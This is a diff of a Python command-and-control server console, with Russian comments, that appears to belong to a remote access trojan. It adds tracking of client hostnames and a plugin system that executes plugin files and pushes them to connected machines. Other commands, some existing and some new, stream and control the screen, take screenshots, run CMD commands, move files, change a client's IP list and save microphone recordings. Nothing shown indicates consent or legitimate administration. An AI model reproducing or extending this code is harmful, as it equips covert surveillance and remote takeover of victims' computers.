@@ -40,7 +40,7 @@ def receive_payload(sock):
         status_byte = header[0]
         length = struct.unpack("!Q", header[1:9])[0]
 
-        if length > 500 * 1024 * 1024:  # Лимит до 500 МБ для скачивания файлов
+        if length > 500 * 1024 * 1024:
             return False, b"Payload desync error"
 
         payload = recv_exact(sock, length)
@@ -141,12 +141,67 @@ def accept_connections(server_socket):
         try:
             conn, addr = server_socket.accept()
             conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            
+            try:
+                conn.settimeout(2.0)
+                hostname_data = conn.recv(1024)
+                conn.settimeout(None)
+                hostname = hostname_data.decode("utf-8", errors="ignore").strip() if hostname_data else "Unknown-PC"
+            except Exception:
+                hostname = "Unknown-PC"
+
             with lock:
-                clients[client_counter] = (conn, addr)
-                print(f"\n[+] Новое подключение: Клиент #{client_counter} ({addr[0]}:{addr[1]})")
+                clients[client_counter] = (conn, addr, hostname)
+                print(f"\n[+] Новое подключение: Клиент #{client_counter} | ПК: {hostname} ({addr[0]}:{addr[1]})")
                 client_counter += 1
         except Exception:
             break
+
+
+def get_plugin_commands_help():
+    """Динамически считывает команды и их справку из всех .plug файлов в папке plugins/"""
+    plugin_commands = []
+    server_plugins_dir = "plugins"
+    if os.path.exists(server_plugins_dir):
+        for filename in os.listdir(server_plugins_dir):
+            if filename.endswith(".plug"):
+                filepath = os.path.join(server_plugins_dir, filename)
+                try:
+                    with open(filepath, "r", encoding="utf-8") as f:
+                        code_content = f.read()
+                    namespace = {}
+                    exec(code_content, namespace)
+                    
+                    # Пытаемся получить словарь с описаниями из get_help()
+                    plugin_helps = {}
+                    if "get_help" in namespace:
+                        try:
+                            plugin_helps = namespace["get_help"]()
+                        except Exception:
+                            pass
+
+                    if "get_commands" in namespace:
+                        cmds = namespace["get_commands"]()
+                        for cmd_name in cmds.keys():
+                            # Ищем описание в get_help() (проверяем точное совпадение или начало ключа)
+                            desc = plugin_helps.get(cmd_name, None)
+                            if not desc:
+                                for h_key, h_desc in plugin_helps.items():
+                                    if h_key.startswith(cmd_name):
+                                        desc = h_key
+                                        break
+                            
+                            # Если справки нет вообще, используем саму команду вместо "Без описания"
+                            if not desc:
+                                desc = cmd_name
+
+                            plugin_commands.append(f"  {desc:<45} - (плагин {filename})")
+                except Exception:
+                    pass
+    
+    if not plugin_commands:
+        return "  (нет загруженных плагинов или команд)"
+    return "\n".join(plugin_commands)
 
 
 def main():
@@ -178,27 +233,38 @@ def main():
             if action == "list":
                 with lock:
                     print("\n--- Подключенные клиенты ---")
-                    for cid, (conn, addr) in list(clients.items()):
-                        print(f" ID: {cid} | IP: {addr[0]}:{addr[1]}")
+                    for cid, (conn, addr, hname) in list(clients.items()):
+                        print(f" ID: {cid} | ПК: {hname} | IP: {addr[0]}:{addr[1]}")
                     print("----------------------------\n")
 
             elif action == "help":
-                print("""
+                plugins_help_text = get_plugin_commands_help()
+                print(f"""
 --- Справка по командам ---
 list                      - Список клиентов
 select <id>               - Выбрать клиента
 back                      - В главное меню
 exit                      - Выход
 
+--- Команды управления плагинами и IP ---
+plugin_list               - Сравнить плагины на клиенте/сервере и доустановить недостающие
+plugin_reload             - Перезагрузить плагины на клиенте
+ip_list                   - Список IP клиента
+ip_add <ip>               - Добавить IP клиенту
+ip_remove <ip/номер>      - Удалить IP у клиента
+
 --- Команды для клиента ---
 stream [fps] [q]          - Стрим экрана
-stream_control [fps] [q]  - Стрим с управлением мышкой/клавиатурой
+stream_control [fps] [q]  - Стрим с управлением
 shot                      - Скриншот
 ls                        - Список дисков / папок
-cd <путь / диск>          - Перемещение (например: cd C: или cd Windows или cd ..)
+cd <путь / диск>          - Перемещение
 cmd <команда>             - Выполнить CMD
-download <путь к файлу>   - Скачать файл с клиента
-upload <локальный путь>   - Загрузить файл клиенту
+download <путь>           - Скачать файл
+upload <путь>             - Загрузить файл
+
+--- Команды из плагинов ---
+{plugins_help_text}
 """)
 
             elif action == "select":
@@ -209,7 +275,8 @@ upload <локальный путь>   - Загрузить файл клиен�
                 with lock:
                     if cid in clients:
                         current_target_id = cid
-                        print(f"[+] Выбран клиент #{cid}")
+                        _, _, hname = clients[cid]
+                        print(f"[+] Выбран клиент #{cid} (ПК: {hname})")
                     else:
                         print("[-] Клиент не найден.")
 
@@ -225,7 +292,7 @@ upload <локальный путь>   - Загрузить файл клиен�
                     print("[-] Сначала выберите клиента через 'select <ID>'")
                     continue
 
-                conn, _ = clients[current_target_id]
+                conn, _, _ = clients[current_target_id]
                 opts = arg.split()
                 fps = opts[0] if len(opts) > 0 and opts[0].isdigit() else "20"
                 quality = opts[1] if len(opts) > 1 and opts[1].isdigit() else "35"
@@ -234,20 +301,11 @@ upload <локальный путь>   - Загрузить файл клиен�
                 conn.sendall(f"{action} {fps} {quality}".encode("utf-8"))
                 start_screen_stream(conn, current_target_id, interactive=interactive)
 
-            elif action in ["cmd", "ls", "cd"]:
-                if not current_target_id or current_target_id not in clients:
-                    print("[-] Сначала выберите клиента через 'select <ID>'")
-                    continue
-                conn, _ = clients[current_target_id]
-                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
-                success, payload = receive_payload(conn)
-                print(payload.decode("utf-8", errors="replace"))
-
             elif action == "shot":
                 if not current_target_id or current_target_id not in clients:
                     print("[-] Сначала выберите клиента через 'select <ID>'")
                     continue
-                conn, _ = clients[current_target_id]
+                conn, _, _ = clients[current_target_id]
                 conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                 success, payload = receive_payload(conn)
                 if success:
@@ -262,14 +320,14 @@ upload <локальный путь>   - Загрузить файл клиен�
                 if not current_target_id or current_target_id not in clients:
                     print("[-] Сначала выберите клиента через 'select <ID>'")
                     continue
-                conn, _ = clients[current_target_id]
+                conn, _, _ = clients[current_target_id]
                 conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                 success, payload = receive_payload(conn)
                 if success:
                     filename = os.path.basename(arg) if arg else "downloaded_file"
                     with open(filename, "wb") as f:
                         f.write(payload)
-                    print(f"[+] Файл успешно скачан и сохранен как: {filename}")
+                    print(f"[+] Файл успешно скачан: {filename}")
                 else:
                     print(f"[-] Ошибка: {payload.decode('utf-8', errors='replace')}")
 
@@ -281,7 +339,7 @@ upload <локальный путь>   - Загрузить файл клиен�
                     print("[-] Локальный файл не найден.")
                     continue
                 
-                conn, _ = clients[current_target_id]
+                conn, _, _ = clients[current_target_id]
                 conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
                 
                 with open(arg, "rb") as f:
@@ -291,15 +349,83 @@ upload <локальный путь>   - Загрузить файл клиен�
                 success, payload = receive_payload(conn)
                 print(payload.decode("utf-8", errors="replace"))
 
+            elif action == "plugin_list":
+                if not current_target_id or current_target_id not in clients:
+                    print("[-] Сначала выберите клиента через 'select <ID>'")
+                    continue
+                
+                server_plugins_dir = "plugins"
+                if not os.path.exists(server_plugins_dir):
+                    os.makedirs(server_plugins_dir)
+                server_files = [f for f in os.listdir(server_plugins_dir) if f.endswith(".plug")]
+
+                conn, _, _ = clients[current_target_id]
+                conn.sendall(f"{action}".encode("utf-8"))
+                success, payload = receive_payload(conn)
+                
+                if not success:
+                    print(f"[-] Ошибка получения данных от клиента: {payload.decode('utf-8', errors='replace')}")
+                    continue
+                
+                client_files_str = payload.decode("utf-8", errors="replace")
+                client_files = [f.strip() for f in client_files_str.splitlines() if f.strip()]
+
+                print("\n--- Сравнение плагинов ---")
+                print(f"Сервер (папка plugins/): {server_files if server_files else '(пусто)'}")
+                print(f"Клиент:                  {client_files if client_files else '(пусто)'}")
+                print("--------------------------")
+
+                missing_on_client = [f for f in server_files if f not in client_files]
+                if missing_on_client:
+                    for f_name in missing_on_client:
+                        print(f"[-] Ошибка: Плагин '{f_name}' отсутствует на клиенте.")
+                        choice = input(f"[?] Установить плагин '{f_name}' на клиент? (y/n): ").strip().lower()
+                        if choice == 'y':
+                            local_path = os.path.join(server_plugins_dir, f_name)
+                            if os.path.exists(local_path):
+                                target_remote_path = f"plugins/{f_name}"
+                                
+                                conn.sendall(f"upload {target_remote_path}".encode("utf-8"))
+                                time.sleep(0.1)
+                                
+                                with open(local_path, "rb") as f_obj:
+                                    file_data = f_obj.read()
+                                
+                                send_payload(conn, 1, file_data)
+                                
+                                up_success, up_payload = receive_payload(conn)
+                                print(up_payload.decode("utf-8", errors="replace"))
+
+                                conn.sendall(b"plugin_reload")
+                                _, reload_payload = receive_payload(conn)
+                                print(reload_payload.decode("utf-8", errors="replace"))
+                            else:
+                                print(f"[-] Локальный файл {local_path} не найден на сервере.")
+                else:
+                    print("[+] Все плагины с сервера присутствуют на клиенте.")
+
             else:
-                print("[-] Неизвестная команда. Введите 'help'.")
+                if not current_target_id or current_target_id not in clients:
+                    print("[-] Сначала выберите клиента через 'select <ID>'")
+                    continue
+                conn, _, _ = clients[current_target_id]
+                conn.sendall(f"{action} {arg}".strip().encode("utf-8"))
+                success, payload = receive_payload(conn)
+
+                if success and action == "mic_record" and len(payload) > 100:
+                    filename = f"client_{current_target_id}_mic.wav"
+                    with open(filename, "wb") as f:
+                        f.write(payload)
+                    print(f"[+] Аудиозапись сохранена на сервере как: {filename}")
+                else:
+                    print(payload.decode("utf-8", errors="replace"))
 
         except KeyboardInterrupt:
             print("\n[*] Выход...")
             break
 
     with lock:
-        for cid, (conn, _) in clients.items():
+        for cid, (conn, _, _) in clients.items():
             try:
                 conn.close()
             except Exception:
